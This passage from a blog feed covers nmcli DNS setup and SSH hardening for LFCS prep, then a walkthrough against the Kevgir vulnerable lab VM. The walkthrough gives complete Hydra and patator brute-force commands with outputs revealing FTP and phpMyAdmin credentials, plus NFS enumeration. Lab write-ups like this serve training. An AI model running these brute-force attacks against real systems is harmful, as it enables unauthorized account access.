</span><span class='line'>ipv4.dns-search:                        
</span><span class='line'>ipv4.dns-options:                       (default)
</span><span class='line'>ipv4.dns-priority:                      0
</span><span class='line'>nmcli con mod static-con ipv4.dns 8.8.8.8
</span><span class='line'>nmcli con up static-con
</span><span class='line'>nmcli con show static-con | grep ipv4.dns
</span><span class='line'>ipv4.dns:                               8.8.8.8
</span><span class='line'>ipv4.dns-search:                        
</span><span class='line'>ipv4.dns-options:                       (default)
</span><span class='line'>ipv4.dns-priority:                      0</span></code></pre></td></tr></table></div></figure>


<h3>Learn more</h3>

<ul>
<li><a href="https://developer.gnome.org/NetworkManager/">NetworkManager documentation</a></li>
<li><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/networking_guide/">RHEL7 networking guide</a></li>
<li><a href="https://www.certdepot.net/rhel7-get-started-nmcli/">CertDepot NetworkManager guide</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
</span><span class='line'>/ You're currently going through a   \
</span><span class='line'>| difficult transition period called |
</span><span class='line'>\ "Life."                            /
</span><span class='line'> ------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Securing SSH]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/05/lfcs-prep-securing-ssh/"/>
    <updated>2018-01-05T16:30:55-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/05/lfcs-prep-securing-ssh</id>
    <content type="html"><![CDATA[<p>SSH-ing between various systems is something you will definitely be doing a lot in infosec. So today I&rsquo;ll quickly go over an exam objective of configuring SSH for key based authentication and disabling root logins for extra security.</p>

<!-- more -->


<p>First of all, let&rsquo;s confirm that I can SSH to my machine as root and login with root&rsquo;s password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.217.129
</span><span class='line'>The authenticity of host '192.168.217.129 (192.168.217.129)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:20TtBMwQAz9KAEK2mApqOksugeZ2yi8oecLRKz8RwB4.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '192.168.217.129' (ECDSA) to the list of known hosts.
</span><span class='line'>root@192.168.217.129's password: 
</span><span class='line'>Last login: Fri Jan  5 14:04:25 2018
</span><span class='line'>[root@CentOS7 ~]# </span></code></pre></td></tr></table></div></figure>


<p>The CentOS server&rsquo;s public key has been added to <code>~/.ssh/known_hosts</code> on my client machine, and I was able to login as root with no problem. Now it&rsquo;s time to change these dangerous defaults. On the client, generate a new pair of keys:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-keygen
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Enter file in which to save the key (/root/.ssh/id_rsa): 
</span><span class='line'>Enter passphrase (empty for no passphrase): 
</span><span class='line'>Enter same passphrase again: 
</span><span class='line'>Your identification has been saved in /root/.ssh/id_rsa.
</span><span class='line'>Your public key has been saved in /root/.ssh/id_rsa.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>SHA256:OLHfszGKJK7wPNhc6OLZv8NeMKOIDuV0OHmBeynLLVI root@kali
</span><span class='line'>The key's randomart image is:
</span><span class='line'>+---[RSA 2048]----+
</span><span class='line'>|                 |
</span><span class='line'>|   .             |
</span><span class='line'>|  . . .          |
</span><span class='line'>|   + o +         |
</span><span class='line'>|  E.=++ S        |
</span><span class='line'>|.*oOo +o .       |
</span><span class='line'>|=*=o+ ... =      |
</span><span class='line'>|==Bo =.. . =     |
</span><span class='line'>|.=+++++ . .      |
</span><span class='line'>+----[SHA256]-----+</span></code></pre></td></tr></table></div></figure>


<p>Now you have a private and public key inside the .ssh directory. Take a look at their permissions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-------  1 root root 1675 Jan  5 16:10 id_rsa
</span><span class='line'>-rw-r--r--  1 root root  391 Jan  5 16:10 id_rsa.pub</span></code></pre></td></tr></table></div></figure>


<p>The private key has read and write permissions only for the owner (600), while the public key has read/write permissions for the owner, and read also for group and others (644).</p>

<p>The public key won&rsquo;t do any good sitting around on the client machine, it needs to be copied to the server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-copy-id root@192.168.217.129
</span><span class='line'>The authenticity of host '192.168.217.129 (192.168.217.129)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:20TtBMwQAz9KAEK2mApqOksugeZ2yi8oecLRKz8RwB4.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
</span><span class='line'>/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
</span><span class='line'>root@192.168.217.129's password: 
</span><span class='line'>
</span><span class='line'>Number of key(s) added: 1
</span><span class='line'>
</span><span class='line'>Now try logging into the machine, with:   "ssh 'root@192.168.217.129'"
</span><span class='line'>and check to make sure that only the key(s) you wanted were added.</span></code></pre></td></tr></table></div></figure>


<p>If you get the error <strong>sign_and_send_pubkey: signing failed: agent refused operation</strong> when trying to SSH to the server, run <em>*ssh-add</em> to add the private key identities to the authentication agent. You can then verify they were added:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-add -l
</span><span class='line'>2048 SHA256:OLHfszGKJK7wPNhc6OLZv8NeMKOIDuV0OHmBeynLLVI /root/.ssh/id_rsa (RSA)
</span><span class='line'>2048 SHA256:OLHfszGKJK7wPNhc6OLZv8NeMKOIDuV0OHmBeynLLVI root@kali (RSA)</span></code></pre></td></tr></table></div></figure>


<p>Now you should be able to login with the public key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.217.129
</span><span class='line'>Last login: Fri Jan  5 15:06:34 2018 from 192.168.217.132
</span><span class='line'>[root@CentOS7 ~]# </span></code></pre></td></tr></table></div></figure>


<p>That worked, but we don&rsquo;t want root to be able to directly SSH into our host. So edit the <code>/etc/ssh/sshd_config</code> file on the server. The default settings are commented, and you can add your own changes and leave them uncommented to override the defaults. I added the following to disable root login and password authentication:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PermitRootLogin no
</span><span class='line'>PasswordAuthentication no</span></code></pre></td></tr></table></div></figure>


<p>Restart ssh and try to login again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.217.129
</span><span class='line'>root@192.168.217.129: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).</span></code></pre></td></tr></table></div></figure>


<p>In practice, you would generate your keys for an account that you will use on that system and if needed, give it sudo privileges to do the work you need.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ You learn to write as if to someone \
</span><span class='line'>| else because NEXT YEAR YOU WILL BE  |
</span><span class='line'>\ "SOMEONE ELSE."                     /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pwning Kevgir]]></title>
    <link href="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/"/>
    <updated>2017-12-02T14:08:05-05:00</updated>
    <id>http://chousensha.github.io/blog/2017/12/02/pwning-kevgir</id>
    <content type="html"><![CDATA[<p>Kevgir is a machine vulnerable to multiple web application vulnerabilities designed by the <em>canyoupwnme</em> team. So..can we pwn it? Let&rsquo;s see!</p>

<!-- more -->


<p>Nmap results reveal that we&rsquo;ll have lots of targets to attack. So I&rsquo;m going to break the format a little bit, and present the results for each port, along with the ways to hack it.</p>

<h2>Port 25 FTP bruteforce with Hydra</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>25/tcp    open  ftp         vsftpd 3.0.2
</span><span class='line'>|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D</span></code></pre></td></tr></table></div></figure>


<p>Couldn&rsquo;t find exploits for this and no anonymous access, so I tried the bruteforce route. Decided to try some other lists from the myriad available on Kali, and wasn&rsquo;t disappointed when I put Hydra to work:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt ftp://192.168.217.128:25
</span><span class='line'>Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-02 15:08:02
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 16 tasks, 4816 login tries (l:112/p:43), ~301 tries per task
</span><span class='line'>[DATA] attacking ftp://192.168.217.128:25/
</span><span class='line'>[25][ftp] host: 192.168.217.128   login: admin   password: admin</span></code></pre></td></tr></table></div></figure>


<p>I used the credentials to log to the FTP server, but didn&rsquo;t find anything particularly interesting. Let&rsquo;s move on!</p>

<h2>Port 80 phpmyadmin bruteforce with patator</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Kevgir VM</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/80.jpg" title="port 80" alt="port 80 apache"></p>

<p>Ran Nikto against it and found phpmyadmin running on it. Now I decided to try a new tool to bruteforce the phmyadmin page. Enter Patator!</p>

<h3>patator</h3>

<p>Homepage: <a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a></p>

<blockquote><p>Patator is a Python multi-purpose brute-forcer, with a modular design and a flexible usage.</p></blockquote>

<p>Let&rsquo;s see the available modules:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Patator v0.6 (http://code.google.com/p/patator/)
</span><span class='line'>Usage: patator module --help
</span><span class='line'>
</span><span class='line'>Available modules:
</span><span class='line'>  + ftp_login     : Brute-force FTP
</span><span class='line'>  + ssh_login     : Brute-force SSH
</span><span class='line'>  + telnet_login  : Brute-force Telnet
</span><span class='line'>  + smtp_login    : Brute-force SMTP
</span><span class='line'>  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
</span><span class='line'>  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
</span><span class='line'>  + finger_lookup : Enumerate valid users using Finger
</span><span class='line'>  + http_fuzz     : Brute-force HTTP
</span><span class='line'>  + pop_login     : Brute-force POP3
</span><span class='line'>  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
</span><span class='line'>  + imap_login    : Brute-force IMAP4
</span><span class='line'>  + ldap_login    : Brute-force LDAP
</span><span class='line'>  + smb_login     : Brute-force SMB
</span><span class='line'>  + smb_lookupsid : Brute-force SMB SID-lookup
</span><span class='line'>  + rlogin_login  : Brute-force rlogin
</span><span class='line'>  + vmauthd_login : Brute-force VMware Authentication Daemon
</span><span class='line'>  + mssql_login   : Brute-force MSSQL
</span><span class='line'>  + oracle_login  : Brute-force Oracle
</span><span class='line'>  + mysql_login   : Brute-force MySQL
</span><span class='line'>  + mysql_query   : Brute-force MySQL queries
</span><span class='line'>  + pgsql_login   : Brute-force PostgreSQL
</span><span class='line'>  + vnc_login     : Brute-force VNC
</span><span class='line'>  + dns_forward   : Forward lookup names
</span><span class='line'>  + dns_reverse   : Reverse lookup subnets
</span><span class='line'>  + snmp_login    : Brute-force SNMP v1/2/3
</span><span class='line'>  + unzip_pass    : Brute-force the password of encrypted ZIP files
</span><span class='line'>  + keystore_pass : Brute-force the password of Java keystore files
</span><span class='line'>  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
</span><span class='line'>  + tcp_fuzz      : Fuzz TCP services
</span><span class='line'>  + dummy_test    : Testing module</span></code></pre></td></tr></table></div></figure>


<p>The Github page has examples for various modules. For this case, I assumed the username will be root, and I adapted a password file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat root_userpass.txt | awk '{print $2}' &gt; ~/Desktop/rootpass.txt</span></code></pre></td></tr></table></div></figure>


<p>The original file had lines of the format <em>root password</em>, so I only selected the second field of the passwords and created a new file for patator. Now I needed to learn more about the patator options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>patator http_fuzz --help
</span><span class='line'>Patator v0.6 (http://code.google.com/p/patator/)
</span><span class='line'>Usage: http_fuzz &lt;module-options ...&gt; [global-options ...]
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  http_fuzz url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
</span><span class='line'>  http_fuzz url=http://10.0.0.1/manager/html user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
</span><span class='line'>  http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</span><span class='line'>
</span><span class='line'>Module options:
</span><span class='line'>  url           : target url (scheme://host[:port]/path?query)
</span><span class='line'>  body          : body data
</span><span class='line'>  header        : use custom headers
</span><span class='line'>  method        : method to use [GET | POST | HEAD | ...]
</span><span class='line'>  auto_urlencode: automatically perform URL-encoding [1|0]
</span><span class='line'>  user_pass     : username and password for HTTP authentication (user:pass)
</span><span class='line'>  auth_type     : type of HTTP authentication [basic | digest | ntlm]
</span><span class='line'>  follow        : follow any Location redirect [0|1]
</span><span class='line'>  max_follow    : redirection limit [5]
</span><span class='line'>  accept_cookie : save received cookies to issue them in future requests [0|1]
</span><span class='line'>  http_proxy    : HTTP proxy to use (host:port)
</span><span class='line'>  ssl_cert      : client SSL certificate file (cert+key in PEM format)
</span><span class='line'>  timeout_tcp   : seconds to wait for a TCP handshake [10]
</span><span class='line'>  timeout       : seconds to wait for a HTTP response [20]
</span><span class='line'>  before_urls   : comma-separated URLs to query before the main request
</span><span class='line'>  before_egrep  : extract data from the before_urls response to place in the main request
</span><span class='line'>  after_urls    : comma-separated URLs to query after the main request
</span><span class='line'>  max_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]
</span><span class='line'>  persistent    : use persistent connections [1|0] 
</span><span class='line'>
</span><span class='line'>Global options:
</span><span class='line'>  --version            show program's version number and exit
</span><span class='line'>  -h, --help           show this help message and exit
</span><span class='line'>
</span><span class='line'>  Execution:
</span><span class='line'>    -x arg             actions and conditions, see Syntax below
</span><span class='line'>    --start=N          start from offset N in the wordlist product
</span><span class='line'>    --stop=N           stop at offset N
</span><span class='line'>    --resume=r1[,rN]*  resume previous run
</span><span class='line'>    -e arg             encode everything between two tags, see Syntax below
</span><span class='line'>    -C str             delimiter string in combo files (default is ':')
</span><span class='line'>    -X str             delimiter string in conditions (default is ',')
</span><span class='line'>
</span><span class='line'>  Optimization:
</span><span class='line'>    --rate-limit=N     wait N seconds between tests (default is 0)
</span><span class='line'>    --max-retries=N    skip payload after N failures (default is 4) (-1 for
</span><span class='line'>                       unlimited)
</span><span class='line'>    -t N, --threads=N  number of threads (default is 10)
</span><span class='line'>
</span><span class='line'>  Logging:
</span><span class='line'>    -l DIR             save output and response data into DIR
</span><span class='line'>    -L SFX             automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
</span><span class='line'>                       (DIR defaults to '/tmp/patator')
</span><span class='line'>
</span><span class='line'>  Debugging:
</span><span class='line'>    -d, --debug        enable debug messages
</span><span class='line'>
</span><span class='line'>Syntax:
</span><span class='line'> -x actions:conditions
</span><span class='line'>
</span><span class='line'>    actions    := action[,action]*
</span><span class='line'>    action     := "ignore" | "retry" | "free" | "quit" | "reset"
</span><span class='line'>    conditions := condition=value[,condition=value]*
</span><span class='line'>    condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep" | "clen"
</span><span class='line'>
</span><span class='line'>    ignore      : do not report
</span><span class='line'>    retry       : try payload again
</span><span class='line'>    free        : dismiss future similar payloads
</span><span class='line'>    quit        : terminate execution now
</span><span class='line'>    reset       : close current connection in order to reconnect next time
</span><span class='line'>
</span><span class='line'>    code        : match status code
</span><span class='line'>    size        : match size (N or N-M or N- or -N)
</span><span class='line'>    time        : match time (N or N-M or N- or -N)
</span><span class='line'>    mesg        : match message
</span><span class='line'>    fgrep       : search for string in mesg
</span><span class='line'>    egrep       : search for regex in mesg
</span><span class='line'>    clen        : match Content-Length header (N or N-M or N- or -N)
</span><span class='line'>
</span><span class='line'>For example, to ignore all redirects to the home page:
</span><span class='line'>... -x ignore:code=302,fgrep='Location: /home.html'
</span><span class='line'>
</span><span class='line'> -e tag:encoding
</span><span class='line'>
</span><span class='line'>    tag        := any unique string (eg. T@G or _@@_ or ...)
</span><span class='line'>    encoding   := "url" | "sha1" | "md5" | "hex" | "b64"
</span><span class='line'>
</span><span class='line'>    url         : url encode
</span><span class='line'>    sha1        : hash in sha1
</span><span class='line'>    md5         : hash in md5
</span><span class='line'>    hex         : encode in hexadecimal
</span><span class='line'>    b64         : encode in base64
</span><span class='line'>
</span><span class='line'>For example, to encode every password in base64:
</span><span class='line'>... host=10.0.0.1 user=admin password=_@@_FILE0_@@_ -e _@@_:b64
</span><span class='line'>
</span><span class='line'>Please read the README inside for more examples and usage information.</span></code></pre></td></tr></table></div></figure>


<p>Luckily, on the Github page there is an example of phpmyadmin bruteforcing that I could adapt:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'</span></code></pre></td></tr></table></div></figure>


<p>And we have the password!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>patator http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</span><span class='line'>17:17:27 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017-12-02 17:17 EST
</span><span class='line'>17:17:27 patator    INFO -                                                                              
</span><span class='line'>17:17:27 patator    INFO - code size:clen       time | candidate                          |   num | mesg
</span><span class='line'>17:17:27 patator    INFO - -----------------------------------------------------------------------------
</span><span class='line'>17:17:27 patator    INFO - 200  9865:7910      0.366 |                                    |     1 | HTTP/1.1 200 OK
</span><span class='line'>17:17:29 patator    INFO - 200  48618:-1       0.938 | toor                               |    34 | HTTP/1.1 200 OK
</span><span class='line'>17:17:29 patator    INFO - Hits/Done/Skip/Fail/Size: 2/52/0/0/52, Avg: 21 r/s, Time: 0h 0m 2s</span></code></pre></td></tr></table></div></figure>


<p>Inside there are multiple databases, but at this point, I moved on to the next.</p>

<h2>Cracking ZIP archives</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>111/tcp   open  rpcbind     2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      33719/tcp  mountd
</span><span class='line'>|   100005  1,2,3      41291/udp  mountd
</span><span class='line'>|   100021  1,3,4      47439/tcp  nlockmgr
</span><span class='line'>|   100021  1,3,4      60285/udp  nlockmgr
</span><span class='line'>|   100024  1          57769/udp  status
</span><span class='line'>|   100024  1          58840/tcp  status
</span><span class='line'>|   100227  2,3         2049/tcp  nfs_acl
</span><span class='line'>|_  100227  2,3         2049/udp  nfs_acl
</span><span class='line'>2049/tcp  open  nfs_acl     2-3 (RPC #100227)
</span><span class='line'>47439/tcp open  nlockmgr    1-4 (RPC #100021)
</span><span class='line'>48137/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>58840/tcp open  status      1 (RPC #100024)
</span><span class='line'>33719/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>43866/tcp open  mountd      1-3 (RPC #100005)</span></code></pre></td></tr></table></div></figure>


<p>Alright, there&rsquo;s an NFS here with what appears to be a backup file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>showmount -e 192.168.217.128
</span><span class='line'>Export list for 192.168.217.128:
</span><span class='line'>/backup *</span></code></pre></td></tr></table></div></figure>


<p>I mounted it on my machine and found an archive:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
